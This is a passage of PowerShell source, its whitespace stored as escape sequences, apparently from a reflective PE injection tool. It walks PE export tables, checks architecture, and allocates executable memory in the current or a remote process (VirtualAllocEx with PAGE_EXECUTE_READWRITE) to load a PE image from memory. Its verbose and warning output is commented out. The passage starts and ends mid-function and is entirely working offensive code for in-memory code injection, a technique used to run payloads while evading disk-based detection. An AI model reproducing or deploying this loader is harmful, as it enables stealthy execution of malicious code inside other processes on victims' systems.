\u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[Parameter(Position = 1, Mandatory = $true)]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[System.Object]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Functions,\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[Parameter(Position = 2, Mandatory = $true)]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[System.Object]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Constants\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0)\n\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[UInt32]$OldProtectFlag = 0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0foreach ($Info in $CopyInfo)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Success = $Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if ($Success -eq $false)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Throw \"Call to VirtualProtect failed\"\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Functions.memcpy.Invoke($Info[0], $Info[1], [UInt64]$Info[2]) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0}\n\n\n\t\t\t\u00a0\u00a0\u00a0#####################################\n\t\t\t\u00a0\u00a0\u00a0########## \u00a0\u00a0\u00a0FUNCTIONS ###########\n\t\t\t\u00a0\u00a0\u00a0#####################################\n\t\t\t\u00a0\u00a0\u00a0Function Get-MemoryProcAddress\n\t\t\t\u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Param(\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[Parameter(Position = 0, Mandatory = $true)]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[IntPtr]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$PEHandle,\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[Parameter(Position = 1, Mandatory = $true)]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[String]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$FunctionName\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Types = Get-Win32Types\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Constants = Get-Win32Constants\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#Get the export table\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.Size -eq 0)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0return [IntPtr]::Zero\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$ExportTablePtr = Add-SignedIntAsUnsigned ($PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.VirtualAddress)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$ExportTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ExportTablePtr, [Type]$Win32Types.IMAGE_EXPORT_DIRECTORY)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0for ($i = 0; $i -lt $ExportTable.NumberOfNames; $i++)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#AddressOfNames is an array of pointers to strings of the names of the functions exported\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$NameOffsetPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNames + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$NamePtr = Add-SignedIntAsUnsigned ($PEHandle) ([System.Runtime.InteropServices.Marshal]::PtrToStructure($NameOffsetPtr, [Type][UInt32]))\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Name = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($NamePtr)\n\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if ($Name -ceq $FunctionName)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#AddressOfNameOrdinals is a table which contains points to a WORD which is the index in to AddressOfFunctions\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0# \u00a0\u00a0\u00a0which contains the offset of the function in to the DLL\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$OrdinalPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNameOrdinals + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16])))\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$FuncIndex = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OrdinalPtr, [Type][UInt16])\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$FuncOffsetAddr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfFunctions + ($FuncIndex * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$FuncOffset = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FuncOffsetAddr, [Type][UInt32])\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0return Add-SignedIntAsUnsigned ($PEHandle) ($FuncOffset)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0return [IntPtr]::Zero\n\t\t\t\u00a0\u00a0\u00a0}\n\n\n\t\t\t\u00a0\u00a0\u00a0Function Invoke-MemoryLoadLibrary\n\t\t\t\u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Param(\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[Parameter(Position = 0, Mandatory = $false)]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[String]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$ExeArgs,\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[Parameter(Position = 1, Mandatory = $false)]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[IntPtr]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$RemoteProcHandle,\n\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[Parameter(Position = 2)]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[Bool]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$ForceASLR = $false\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#Get Win32 constants and functions\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Constants = Get-Win32Constants\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Functions = Get-Win32Functions\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Types = Get-Win32Types\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$RemoteLoading = $false\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if (($RemoteProcHandle -ne $null) -and ($RemoteProcHandle -ne [IntPtr]::Zero))\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$RemoteLoading = $true\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#Get basic PE information\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#Write-Verbose \"Getting basic PE information from the file\"\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$PEInfo = Get-PEBasicInfo -Win32Types $Win32Types\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$OriginalImageBase = $PEInfo.OriginalImageBase\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$NXCompatible = $true\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if (([Int] $PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0##Write-Warning \"PE is not compatible with DEP, might cause issues\" -WarningAction Continue\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$NXCompatible = $false\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#Verify that the PE and the current process are the same bits (32bit or 64bit)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Process64Bit = $true\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if ($RemoteLoading -eq $true)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke(\"kernel32.dll\")\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Result = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, \"IsWow64Process\")\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if ($Result -eq [IntPtr]::Zero)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Throw \"Couldn't locate IsWow64Process function to determine if target process is 32bit or 64bit\"\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[Bool]$Wow64Process = $false\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Success = $Win32Functions.IsWow64Process.Invoke($RemoteProcHandle, [Ref]$Wow64Process)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if ($Success -eq $false)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Throw \"Call to IsWow64Process failed\"\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if (($Wow64Process -eq $true) -or (($Wow64Process -eq $false) -and ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4)))\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Process64Bit = $false\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#PowerShell needs to be same bit as the PE being loaded for IntPtr to work correctly\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$PowerShell64Bit = $true\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$PowerShell64Bit = $false\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if ($PowerShell64Bit -ne $Process64Bit)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0throw \"PowerShell must be same architecture (x86/x64) as PE being loaded and remote process\"\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0else\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Process64Bit = $false\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if ($Process64Bit -ne $PEInfo.PE64Bit)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Throw \"PE platform doesn't match the architecture of the process it is being loaded in (32/64bit)\"\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#Allocate memory and write the PE to memory. If the PE supports ASLR, allocate to a random memory address\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#Write-Verbose \"Allocating memory for the PE and write its headers to memory\"\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#ASLR check\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[IntPtr]$LoadAddr = [IntPtr]::Zero\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$PESupportsASLR = ([Int] $PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE) -eq $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if ((-not $ForceASLR) -and (-not $PESupportsASLR))\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#Write-Warning \"PE file being reflectively loaded is not ASLR compatible. If the loading fails, try restarting PowerShell and trying again OR try using the -ForceASLR flag (could cause crashes)\" -WarningAction Continue\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[IntPtr]$LoadAddr = $OriginalImageBase\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0elseif ($ForceASLR -and (-not $PESupportsASLR))\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#Write-Verbose \"PE file doesn't support ASLR but -ForceASLR is set. Forcing ASLR on the PE file. This could result in a crash.\"\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if ($ForceASLR -and $RemoteLoading)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#Write-Error \"Cannot use ForceASLR when loading in to a remote process.\" -ErrorAction Stop\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if ($RemoteLoading -and (-not $PESupportsASLR))\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#Write-Error \"PE doesn't support ASLR. Cannot load a non-ASLR PE in to a remote process\" -ErrorAction Stop\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$PEHandle = [IntPtr]::Zero \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#This is where the PE is allocated in PowerShell\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$EffectivePEHandle = [IntPtr]::Zero \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#This is the address the PE will be loaded to. If it is loaded in PowerShell, this equals $PEHandle. If it is loaded in a remote process, this is the address in the remote process.\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if ($RemoteLoading -eq $true)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#Allocate space in the remote process, and also allocate space in PowerShell. The PE will be setup in PowerShell and copied to the remote process when it is setup\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$PEHandle = $Win32Functions.VirtualAlloc.Invoke([IntPtr]::Zero, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#todo, error handling needs to delete this memory if an error happens along the way\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$EffectivePEHandle = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, $LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if ($EffectivePEHandle -eq [IntPtr]::Zero)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Throw \"Unable to allocate memory in the remote process. If the PE being loaded doesn't support ASLR, it could be that the requested base address of the PE is already in use\"\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0else\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if ($NXCompatible -eq $true)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0else\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$EffectivePEHandle = $PEHandle\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[IntPtr]$PEEndAddress = Add-SignedIntAsUnsigned ($PEHandle) ([Int64]$PEInfo.SizeOfImage)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if ($PEHandle -eq [IntPtr]::Zero)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Throw \"VirtualAlloc failed to allocate memory for PE. If PE is not ASLR compatible, try running the script in a new PowerShell process (the new PowerShell process will have a different memory layout, so the address the PE wants might be free).\"\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0} \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $PEHandle, $PEInfo.SizeOfHeaders) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#Now that the PE is in memory, get more detailed information about it\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#Write-Verbose \"Getting detailed PE information from the headers loaded in memory\"\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$PEInfo | Add-Member -MemberType NoteProperty -Name EndAddress -Value $PEEndAddress\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$PEInfo | Add-Member -MemberType NoteProperty -Name EffectivePEHandle -Value $EffectivePEHandle\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#Write-Verbose \"StartAddress: $(Get-Hex $PEHandle) \u00a0\u00a0\u00a0EndAddress: $(Get-Hex $PEEndAddress)\"\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 